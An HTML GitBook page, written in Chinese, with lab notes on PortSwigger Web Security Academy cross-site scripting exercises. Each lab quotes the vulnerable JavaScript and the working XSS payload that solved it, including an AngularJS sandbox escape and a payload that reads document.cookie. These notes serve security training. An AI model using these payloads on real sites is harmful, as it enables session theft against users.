@@ -1,0 +1,580 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>webacademy XSS · GitBook</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        
+        
+        
+    
+    <link rel="stylesheet" href="gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="WMCTF 2023 web writeup.html" />
+    
+    
+    <link rel="prev" href="羊城杯 2023 web writeup.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            <br />
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    About This Site
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="羊城杯 2023 web writeup.html">
+            
+                <a href="羊城杯 2023 web writeup.html#20230903">
+            
+                    
+                    羊城杯 2023 web writeup
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="webacademy XSS.html">
+            
+                <a href="webacademy XSS.html#20230829">
+            
+                    
+                    webacademy XSS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="WMCTF 2023 web writeup.html">
+            
+                <a href="WMCTF 2023 web writeup.html#20230824">
+            
+                    
+                    WMCTF2023 web writeup
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" data-path="Racing and Smashing the state machine.html">
+            
+                <a href="Racing and Smashing the state machine.html#20230817">
+            
+                    
+                    Racing and Smashing the state machine
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6" data-path="ioredis源码阅读.html">
+            
+                <a href="ioredis源码阅读.html#20230718">
+            
+                    
+                    ioredis源码阅读
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7" data-path="Gandalf AI challenge.html">
+            
+                <a href="Gandalf AI challenge.html#20230707">
+            
+                    
+                    Gandalf AI challenge
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8" data-path="NSSCTF challenges.html">
+            
+                <a href="NSSCTF challenges.html#20230605">
+            
+                    
+                    NSSCTF challenges
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9" data-path="JS 的一些特性：原型链，作用域，闭包.html">
+            
+                <a href="JS 的一些特性：原型链，作用域，闭包.html#20230117">
+            
+                    
+                    JS 的一些特性：原型链，作用域，闭包
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.10" data-path="CBCTF-0RAYS协会招新.html">
+            
+                <a href="CBCTF-0RAYS协会招新.html#20221212">
+            
+                    
+                    CBCTF-0RAYS协会招新
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.11" data-path="utils&memo.html">
+            
+                <a href="utils&memo.html#20230423">
+            
+                    
+                    utils&memo
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="#" target="blank" class="gitbook-link">
+            <!-- Published with GitBook -->Powered By Gitbook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="." >webacademy XSS</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <p><em>&#x524D;&#x9762;&#x8FD8;&#x6709;&#x51E0;&#x9053;&#x4EE5;&#x524D;&#x505A;&#x7684; &#x6BD5;&#x7ADF;&#x7B80;&#x5355;&#x4E0D;&#x662F;&#x5F88;&#x6709;&#x5FC5;&#x8981;&#x91CD;&#x65B0;&#x8BB0;&#x5F55;</em></p>
+<h2 id="lab-dom-xss-in-jquery-selector-sink-using-a-hashchange-event">Lab: <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based" target="_blank">DOM XSS</a> in jQuery selector sink using a hashchange event</h2>
+<p>JQuery:</p>
+<pre><code class="lang-js">$(<span class="hljs-built_in">window</span>).on(<span class="hljs-string">&apos;hashchange&apos;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>{
+                            <span class="hljs-keyword">var</span> post = $(<span class="hljs-string">&apos;section.blog-list h2:contains(&apos;</span> + <span class="hljs-built_in">decodeURIComponent</span>(<span class="hljs-built_in">window</span>.location.hash.slice(<span class="hljs-number">1</span>)) + <span class="hljs-string">&apos;)&apos;</span>);
+                            <span class="hljs-keyword">if</span> (post) post.get(<span class="hljs-number">0</span>).scrollIntoView();
+                        });
+</code></pre>
+<p>&#x5F53; URL &#x7684;&#x7247;&#x6BB5;&#x6807;&#x8BC6;&#x7B26;&#x66F4;&#x6539;&#x65F6;&#xFF0C;&#x5C06;&#x89E6;&#x53D1;<strong>hashchange</strong>&#x4E8B;&#x4EF6;&#xFF0C;&#x4F20;&#x9012;&#x5230; Jquery &#x9009;&#x62E9;&#x5668;&#xFF0C;&#x9009;&#x62E9;&#x5230; h2 &#x4E2D; &#x5B58;&#x5728; <code>decodeURIComponent(window.location.hash.slice(1))</code> &#x7684;&#x5143;&#x7D20;&#xFF08;&#x81EA;&#x7136;&#x662F;&#x4E0D;&#x5B58;&#x5728;&#xFF09;&#x3002;&#x7136;&#x540E;<code>scrollIntoView()</code>&#x4F7F;&#x7528;&#x6237;&#x53EF;&#x89C1;&#x3002;</p>
+<p>&#x56E0;&#x800C; payload &#x8981;&#x89E6;&#x53D1; haschange &#x4E8B;&#x4EF6;&#x3002;</p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://YOUR-LAB-ID.web-security-academy.net/#&quot;</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;this.src+=&apos;&lt;img src=x onerror=print()&gt;&apos;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span>
+</code></pre>
+<h2 id="lab-reflected-xss-into-attribute-with-angle-brackets-html-encoded">Lab: <a href="https://portswigger.net/web-security/cross-site-scripting/reflected" target="_blank">Reflected XSS</a> into attribute with angle brackets HTML-encoded</h2>
+<p>&#x5C5E;&#x6027;&#x6CE8;&#x5165;&#x3002;&#x8FD9;&#x4E2A;&#x6211;&#x719F; </p>
+<p>&#x67E5;&#x9605; <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank">https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</a></p>
+<pre><code class="lang-js"><span class="hljs-string">&quot; autofocus onfocusin=alert(window.origin) b=&quot;</span>
+</code></pre>
+<h2 id="lab-stored-xss-into-anchor-href-attribute-with-double-quotes-html-encoded">Lab: <a href="https://portswigger.net/web-security/cross-site-scripting/stored" target="_blank">Stored XSS</a> into anchor <code>href</code> attribute with double quotes HTML-encoded</h2>
+<p>&#x8981;&#x5B9E;&#x73B0;&#x70B9;&#x51FB;&#x540D;&#x5B57;&#x7684;&#x65F6;&#x5019;alert&#xFF0C;&#x6D4B;&#x8BD5;&#x53D1;&#x73B0;&#x70B9;&#x51FB;&#x8DF3;&#x8F6C;&#x5230;&#x586B;&#x5165;&#x7684;website&#x3002;js&#x4F2A;&#x534F;&#x8BAE;&#x76F4;&#x63A5;&#x8FC7;</p>
+<pre><code class="lang-js">javascript:alert(<span class="hljs-built_in">window</span>.origin)
+</code></pre>
+<p>&#x4E5F;&#x5C31;&#x662F;a.href&#x7684;&#x6EE5;&#x7528;</p>
+<h2 id="lab-reflected-xss-into-a-javascript-string-with-angle-brackets-html-encoded">Lab: <a href="https://portswigger.net/web-security/cross-site-scripting/reflected" target="_blank">Reflected XSS</a> into a JavaScript string with angle brackets HTML encoded</h2>
+<pre><code class="lang-js"> <span class="hljs-keyword">var</span> searchTerms = <span class="hljs-string">&apos;search&#x53C2;&#x6570;&apos;</span>;
+<span class="hljs-built_in">document</span>.write(<span class="hljs-string">&apos;&lt;img src=&quot;/resources/images/tracker.gif?searchTerms=&apos;</span>+<span class="hljs-built_in">encodeURIComponent</span>(searchTerms)+<span class="hljs-string">&apos;&quot;&gt;&apos;</span>);
+</code></pre>
+<p>JS&#x7684;&#x5185;&#x5BB9;&#x76F4;&#x63A5;&#x6765;&#x6E90;&#x4E8E;&#x53C2;&#x6570;&#xFF0C;&#x5E94;&#x8BE5;&#x662F;&#x505A;&#x4E86;&#x5565;&#x6A21;&#x677F;&#x6E32;&#x67D3;&#x7684;&#x3002;&#x6CE8;&#x5165;js&#x4EE3;&#x7801;</p>
+<pre><code>%27;%0aalert(window.origin);%0ab=&apos;
+</code></pre><h2 id="lab-dom-xss-in-documentwrite-sink-using-source-locationsearch-inside-a-select-element">Lab: <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based" target="_blank">DOM XSS</a> in <code>document.write</code> sink using source <code>location.search</code> inside a select element</h2>
+<pre><code class="lang-js"><span class="hljs-keyword">var</span> stores = [<span class="hljs-string">&quot;London&quot;</span>,<span class="hljs-string">&quot;Paris&quot;</span>,<span class="hljs-string">&quot;Milan&quot;</span>];
+<span class="hljs-keyword">var</span> store = (<span class="hljs-keyword">new</span> URLSearchParams(<span class="hljs-built_in">window</span>.location.search)).get(<span class="hljs-string">&apos;storeId&apos;</span>);
+<span class="hljs-built_in">document</span>.write(<span class="hljs-string">&apos;&lt;select name=&quot;storeId&quot;&gt;&apos;</span>);
+<span class="hljs-keyword">if</span>(store) {
+    <span class="hljs-built_in">document</span>.write(<span class="hljs-string">&apos;&lt;option selected&gt;&apos;</span>+store+<span class="hljs-string">&apos;&lt;/option&gt;&apos;</span>);
+}
+<span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;i&lt;stores.length;i++) {
+    <span class="hljs-keyword">if</span>(stores[i] === store) {
+        <span class="hljs-keyword">continue</span>;
+    }
+    <span class="hljs-built_in">document</span>.write(<span class="hljs-string">&apos;&lt;option&gt;&apos;</span>+stores[i]+<span class="hljs-string">&apos;&lt;/option&gt;&apos;</span>);
+}
+<span class="hljs-built_in">document</span>.write(<span class="hljs-string">&apos;&lt;/select&gt;&apos;</span>);
+</code></pre>
+<p>&#x76F4;&#x63A5;Inject</p>
+<pre><code>/product?productId=1&amp;storeId=&lt;script&gt;alert(window.origin)&lt;/script&gt;
+</code></pre><h2 id="lab-dom-xss-in-angularjs-expression-with-angle-brackets-and-double-quotes-html-encoded">Lab: <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based" target="_blank">DOM XSS</a> in AngularJS expression with angle brackets and double quotes HTML-encoded</h2>
+<p>url&#x53C2;&#x6570;&#x5728;&gt;&lt;&#x4E2D;&#x95F4;&#xFF0C;&#x5C16;&#x62EC;&#x53F7;&#x8F6C;&#x4E49;&#x3002;&#x65E0;&#x6CD5;&#x9003;&#x51FA;</p>
+<p>&#x800C;&#x7531;&#x4E8E;AngularJS&#x7684;&#x5F15;&#x5165;&#xFF0C;&#x53EF;&#x4EE5; front-end SSTI</p>
+<pre><code>{{$on.constructor(&apos;alert(window.origin)&apos;)()}}
+</code></pre><p>&#x53E6;&#x5916; AngularJS gadget (SSTI)&#x8FD8;&#x53EF;&#x4EE5;&#x7528;&#x6765; bypass CSP &#x3002;payload &#x6536;&#x96C6;&#xFF1A;<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md" target="_blank">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md</a> &#x4EE5;&#x53CA; <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-sandbox-escapes-reflected" target="_blank">https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-sandbox-escapes-reflected</a></p>
+<h2 id="lab-reflected-dom-xss">Lab: Reflected <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based" target="_blank">DOM XSS</a></h2>
+<pre><code class="lang-js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">search</span>(<span class="hljs-params">path</span>) </span>{
+    <span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> XMLHttpRequest();
+    xhr.onreadystatechange = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{
+        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.readyState == <span class="hljs-number">4</span> &amp;&amp; <span class="hljs-keyword">this</span>.status == <span class="hljs-number">200</span>) {
+            <span class="hljs-built_in">eval</span>(<span class="hljs-string">&apos;var searchResultsObj = &apos;</span> + <span class="hljs-keyword">this</span>.responseText);
+            displaySearchResults(searchResultsObj);
+        }
+    };
+    xhr.open(<span class="hljs-string">&quot;GET&quot;</span>, path + <span class="hljs-built_in">window</span>.location.search);
+    xhr.send();
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">displaySearchResults</span>(<span class="hljs-params">searchResultsObj</span>) </span>{
+        <span class="hljs-keyword">var</span> blogHeader = <span class="hljs-built_in">document</span>.getElementsByClassName(<span class="hljs-string">&quot;blog-header&quot;</span>)[<span class="hljs-number">0</span>];
+        <span class="hljs-keyword">var</span> blogList = <span class="hljs-built_in">document</span>.getElementsByClassName(<span class="hljs-string">&quot;blog-list&quot;</span>)[<span class="hljs-number">0</span>];
+        <span class="hljs-keyword">var</span> searchTerm = searchResultsObj.searchTerm
+        <span class="hljs-keyword">var</span> searchResults = searchResultsObj.results
+
+        <span class="hljs-keyword">var</span> h1 = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;h1&quot;</span>);
+        h1.innerText = searchResults.length + <span class="hljs-string">&quot; search results for &apos;&quot;</span> + searchTerm + <span class="hljs-string">&quot;&apos;&quot;</span>;
+        blogHeader.appendChild(h1);
+        <span class="hljs-keyword">var</span> hr = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;hr&quot;</span>);
+        blogHeader.appendChild(hr)
+
+        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; searchResults.length; ++i)
+        {
+            <span class="hljs-keyword">var</span> searchResult = searchResults[i];
+            <span class="hljs-keyword">if</span> (searchResult.id) {
+                <span class="hljs-keyword">var</span> blogLink = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;a&quot;</span>);
+                blogLink.setAttribute(<span class="hljs-string">&quot;href&quot;</span>, <span class="hljs-string">&quot;/post?postId=&quot;</span> + searchResult.id);
+
+                <span class="hljs-keyword">if</span> (searchResult.headerImage) {
+                    <span class="hljs-keyword">var</span> headerImage = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;img&quot;</span>);
+                    headerImage.setAttribute(<span class="hljs-string">&quot;src&quot;</span>, <span class="hljs-string">&quot;/image/&quot;</span> + searchResult.headerImage);
+                    blogLink.appendChild(headerImage);
+                }
+
+                blogList.appendChild(blogLink);
+            }
+
+            blogList.innerHTML += <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;
+
+            <span class="hljs-keyword">if</span> (searchResult.title) {
+                <span class="hljs-keyword">var</span> title = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;h2&quot;</span>);
+                title.innerText = searchResult.title;
+                blogList.appendChild(title);
+            }
+
+            <span class="hljs-keyword">if</span> (searchResult.summary) {
+                <span class="hljs-keyword">var</span> summary = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;p&quot;</span>);
+                summary.innerText = searchResult.summary;
+                blogList.appendChild(summary);
+            }
+
+            <span class="hljs-keyword">if</span> (searchResult.id) {
+                <span class="hljs-keyword">var</span> viewPostButton = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;a&quot;</span>);
+                viewPostButton.setAttribute(<span class="hljs-string">&quot;class&quot;</span>, <span class="hljs-string">&quot;button is-small&quot;</span>);
+                viewPostButton.setAttribute(<span class="hljs-string">&quot;href&quot;</span>, <span class="hljs-string">&quot;/post?postId=&quot;</span> + searchResult.id);
+                viewPostButton.innerText = <span class="hljs-string">&quot;View post&quot;</span>;
+            }
+        }
+
+        <span class="hljs-keyword">var</span> linkback = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;div&quot;</span>);
+        linkback.setAttribute(<span class="hljs-string">&quot;class&quot;</span>, <span class="hljs-string">&quot;is-linkback&quot;</span>);
+        <span class="hljs-keyword">var</span> backToBlog = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;a&quot;</span>);
+        backToBlog.setAttribute(<span class="hljs-string">&quot;href&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>);
+        backToBlog.innerText = <span class="hljs-string">&quot;Back to Blog&quot;</span>;
+        linkback.appendChild(backToBlog);
+        blogList.appendChild(linkback);
+    }
+}
+</code></pre>
+<p>&#x8C03;&#x7528;&#x4E86;<code>/search-results?search=123</code>&#x7684; api &#x505A;&#x4E86;&#x4E00;&#x4E2A; ajax (&#x5E94;&#x8BE5;&#x7B97;&#x662F;&#x5427;)&#x3002;&#x811A;&#x672C;&#x4E2D;&#x76F4;&#x63A5;&#x62FC;&#x63A5; responseText eval&#x4E86;&#xFF0C;&#x5982;&#x679C; api &#x53EF;&#x4EE5;&#x6CE8;&#x5165;&#x90A3;&#x5C31;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0; alert&#x3002;</p>
+<p>&#x6D4B;&#x8BD5;&#x53D1;&#x73B0; api &#x7684;&#x8F6C;&#x4E49;&#x7B56;&#x7565;&#x6709;&#x95EE;&#x9898;&#xFF0C;&#x8F93;&#x5165;<code>\&quot;</code>&#x8FD4;&#x56DE;&#x5C31;&#x4E0D;&#x662F;&#x5408;&#x6CD5; json &#x4E86;&#xFF0C;escape &#x6389;&#x4E86;&#x4E00;&#x4E2A;&#x5F15;&#x53F7;</p>
+<p>&#x6784;&#x9020;&#x5408;&#x6CD5; json</p>
+<pre><code>\&quot;-alert(window.origin)}//
+</code></pre><p>&#x7531;&#x4E8E;&#x8FD9;&#x4E2A;<code>-</code>&#x4EC5;&#x4EC5;&#x662F;&#x8BA1;&#x7B97;&#x7B26;&#x53F7;&#xFF0C;&#x6539;&#x6210;<code>*</code>&#x6216;<code>/</code>&#x90FD;&#x884C;&#x3002;&#x800C;<code>+</code>&#x56E0;&#x4E3A;&#x4F1A;&#x88AB; http &#x534F;&#x8BAE;&#x8BA4;&#x4F5C;&#x7A7A;&#x683C;&#x6240;&#x4EE5;&#x4E0D;&#x80FD;&#x6B63;&#x5E38;&#x5229;&#x7528;&#x3002;&#x6539;&#x6210;<code>%2B</code>&#x5C31;&#x53EF;&#x4EE5;&#x4E86;</p>
+<pre><code>\&quot;%2Balert()}//
+</code></pre><h2 id="lab-stored-dom-xss">Lab: Stored <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based" target="_blank">DOM XSS</a></h2>
+<p>&#x968F;&#x4FBF;&#x70B9;&#x4E00;&#x4E2A;&#x6587;&#x7AE0;<code>Ctrl + U</code>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6CA1;&#x6709;&#x8BC4;&#x8BBA;&#x3002;&#x524D;&#x7AEF;&#x6E32;&#x67D3;</p>
+<pre><code class="lang-js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">loadComments</span>(<span class="hljs-params">postCommentPath</span>) </span>{
+    <span class="hljs-keyword">let</span> xhr = <span class="hljs-keyword">new</span> XMLHttpRequest();
+    xhr.onreadystatechange = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{
+        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.readyState == <span class="hljs-number">4</span> &amp;&amp; <span class="hljs-keyword">this</span>.status == <span class="hljs-number">200</span>) {
+            <span class="hljs-keyword">let</span> comments = <span class="hljs-built_in">JSON</span>.parse(<span class="hljs-keyword">this</span>.responseText);
+            displayComments(comments);
+        }
+    };
+    xhr.open(<span class="hljs-string">&quot;GET&quot;</span>, postCommentPath + <span class="hljs-built_in">window</span>.location.search);
+    xhr.send();
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escapeHTML</span>(<span class="hljs-params">html</span>) </span>{
+        <span class="hljs-keyword">return</span> html.replace(<span class="hljs-string">&apos;&lt;&apos;</span>, <span class="hljs-string">&apos;&amp;lt;&apos;</span>).replace(<span class="hljs-string">&apos;&gt;&apos;</span>, <span class="hljs-string">&apos;&amp;gt;&apos;</span>);
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">displayComments</span>(<span class="hljs-params">comments</span>) </span>{
+        <span class="hljs-keyword">let</span> userComments = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;user-comments&quot;</span>);
+
+        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; comments.length; ++i)
+        {
+            comment = comments[i];
+            <span class="hljs-keyword">let</span> commentSection = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;section&quot;</span>);
+            commentSection.setAttribute(<span class="hljs-string">&quot;class&quot;</span>, <span class="hljs-string">&quot;comment&quot;</span>);
+
+            <span class="hljs-keyword">let</span> firstPElement = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;p&quot;</span>);
+
+            <span class="hljs-keyword">let</span> avatarImgElement = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;img&quot;</span>);
+            avatarImgElement.setAttribute(<span class="hljs-string">&quot;class&quot;</span>, <span class="hljs-string">&quot;avatar&quot;</span>);
+            avatarImgElement.setAttribute(<span class="hljs-string">&quot;src&quot;</span>, comment.avatar ? escapeHTML(comment.avatar) : <span class="hljs-string">&quot;/resources/images/avatarDefault.svg&quot;</span>);
+
+            <span class="hljs-keyword">if</span> (comment.author) {
+                <span class="hljs-keyword">if</span> (comment.website) {
+                    <span class="hljs-keyword">let</span> websiteElement = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;a&quot;</span>);
+                    websiteElement.setAttribute(<span class="hljs-string">&quot;id&quot;</span>, <span class="hljs-string">&quot;author&quot;</span>);
+                    websiteElement.setAttribute(<span class="hljs-string">&quot;href&quot;</span>, comment.website);
+                    firstPElement.appendChild(websiteElement)
+                }
+
+                <span class="hljs-keyword">let</span> newInnerHtml = firstPElement.innerHTML + escapeHTML(comment.author)
+                firstPElement.innerHTML = newInnerHtml
+            }
+
+            <span class="hljs-keyword">if</span> (comment.date) {
+                <span class="hljs-keyword">let</span> dateObj = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>(comment.date)
+                <span class="hljs-keyword">let</span> month = <span class="hljs-string">&apos;&apos;</span> + (dateObj.getMonth() + <span class="hljs-number">1</span>);
+                <span class="hljs-keyword">let</span> day = <span class="hljs-string">&apos;&apos;</span> + dateObj.getDate();
+                <span class="hljs-keyword">let</span> year = dateObj.getFullYear();
+
+                <span class="hljs-keyword">if</span> (month.length &lt; <span class="hljs-number">2</span>)
+                    month = <span class="hljs-string">&apos;0&apos;</span> + month;
+                <span class="hljs-keyword">if</span> (day.length &lt; <span class="hljs-number">2</span>)
+                    day = <span class="hljs-string">&apos;0&apos;</span> + day;
+
+                dateStr = [day, month, year].join(<span class="hljs-string">&apos;-&apos;</span>);
+
+                <span class="hljs-keyword">let</span> newInnerHtml = firstPElement.innerHTML + <span class="hljs-string">&quot; | &quot;</span> + dateStr
+                firstPElement.innerHTML = newInnerHtml
+            }
+
+            firstPElement.appendChild(avatarImgElement);
+
+            commentSection.appendChild(firstPElement);
+
+            <span class="hljs-keyword">if</span> (comment.body) {
+                <span class="hljs-keyword">let</span> commentBodyPElement = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;p&quot;</span>);
+                commentBodyPElement.innerHTML = escapeHTML(comment.body);
+
+                commentSection.appendChild(commentBodyPElement);
+            }
+            commentSection.appendChild(<span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;p&quot;</span>));
+
+            userComments.appendChild(commentSection);
+        }
+    }
+};
+</code></pre>
+<p>js &#x4E2D;<code>replace</code>&#x53EA;&#x4F1A;&#x66FF;&#x6362;&#x5B57;&#x7B26;&#x7684;&#x7B2C;&#x4E00;&#x6B21;&#x51FA;&#x73B0;&#x3002;&#x6240;&#x4EE5; content &#x586B;&#x5165;<code>&lt;&gt;&lt;img src=x onerror=alert(window.origin)/&gt;</code>&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8FC7;</p>
+<p><em>&#x8FD9;&#x91CC;&#x53D1;&#x73B0; svg &#x597D;&#x50CF;&#x4E0D;&#x80FD;&#x5728; p &#x5143;&#x7D20;&#x91CC;&#x7528; &#x5C0F;&#x8BB0;&#x4E00;&#x4E0B;</em></p>
+<p>&#x7136;&#x540E;&#x518D;&#x6D4B;&#x8BD5;&#x4E86;&#x770B;&#x8D77;&#x6765;&#x597D;&#x50CF;&#x5B58;&#x5728;&#x7684;<code>Obfuscating attacks via HTML encoding</code>&#x3002;&#x7531;&#x4E8E;&#x63D0;&#x53D6;&#x6587;&#x5B57;&#x7528;&#x7684;&#x662F;<code>innerHTML</code>&#x800C;&#x4E0D;&#x662F;<code>innerText</code>&#x65E0;&#x6CD5;&#x5B9E;&#x73B0;&#x3002;</p>
+<h2 id="lab-reflected-xss-into-html-context-with-most-tags-and-attributes-blocked">Lab: <a href="https://portswigger.net/web-security/cross-site-scripting/reflected" target="_blank">Reflected XSS</a> into HTML context with most tags and attributes blocked</h2>
+<p>&#x4E4B;&#x524D;&#x6316;&#x81EA;&#x5DF1;&#x5B66;&#x6821;&#x9047;&#x5230;&#x8FC7;<a href="https://src.sjtu.edu.cn/post/237670/" target="_blank">&#x7C7B;&#x4F3C;&#x7684;</a>&#xFF0C;&#x4E0D;&#x8FC7;&#x662F;&#x5B58;&#x50A8;&#x578B;&#x7684;&#x3002;&#x4E5F;&#x5C31;&#x662F; <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank">cheet sheet</a> &#x627E;&#x4E00;&#x4E2A;&#x4E0D;&#x5E38;&#x89C1;&#x7684;&#x5C5E;&#x6027;&#x3002;</p>
+<pre><code class="lang-html">123&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">@<span class="hljs-keyword">keyframes</span> x{}</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;animation-name:x&quot;</span> <span class="hljs-attr">onanimationend</span>=<span class="hljs-string">&quot;1+1;b=document;a=window.alert;a(b.cookie)&quot;</span><span class="hljs-string">&lt;</span>/<span class="hljs-attr">input</span>&gt;</span>&quot;
+</code></pre>
+<p><del><em>&#x8FD9;&#x4E2A;&#x5B58;&#x50A8;&#x578B;+&#x5BFC;&#x81F4;&#x767B;&#x5F55;&#x51ED;&#x8BC1;&#x6CC4;&#x9732;&#x7ADF;&#x7136;&#x7ED9;&#x6211;&#x4F4E;&#x5371;&#x1FAE0;&#x3002;&#x3002;</em></del></p>
+<p>&#x8FD9;&#x9898;&#x7684;&#x5408;&#x6CD5;tag&#x548C;attributes&#x5C5E;&#x5B9E;&#x96BE;&#x627E;&#x3002;&#x4E0D;&#x60F3;&#x5199;&#x6279;&#x91CF;&#x68C0;&#x6D4B;&#x7684;&#xFF0C;&#x9042;&#x6284;&#x7B54;&#x6848;&#x4E86;</p>
+<pre><code class="lang-html">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onresize</span>=<span class="hljs-string">print()</span>&gt;</span>
+</code></pre>
+<p><code>onresize</code>&#x4E8B;&#x4EF6;&#x5728;<code>&#x7A97;&#x53E3;&#x6216;&#x6846;&#x67B6;&#x88AB;&#x8C03;&#x6574;&#x5927;&#x5C0F;&#x65F6;</code>&#x53D1;&#x751F;&#x3002;&#x7531;&#x4E8E;&#x7ED9;&#x4E86;exploit-server&#xFF0C;&#x7528; iframe &#x4FEE;&#x6539;&#x6846;&#x67B6;&#x5927;&#x5C0F;</p>
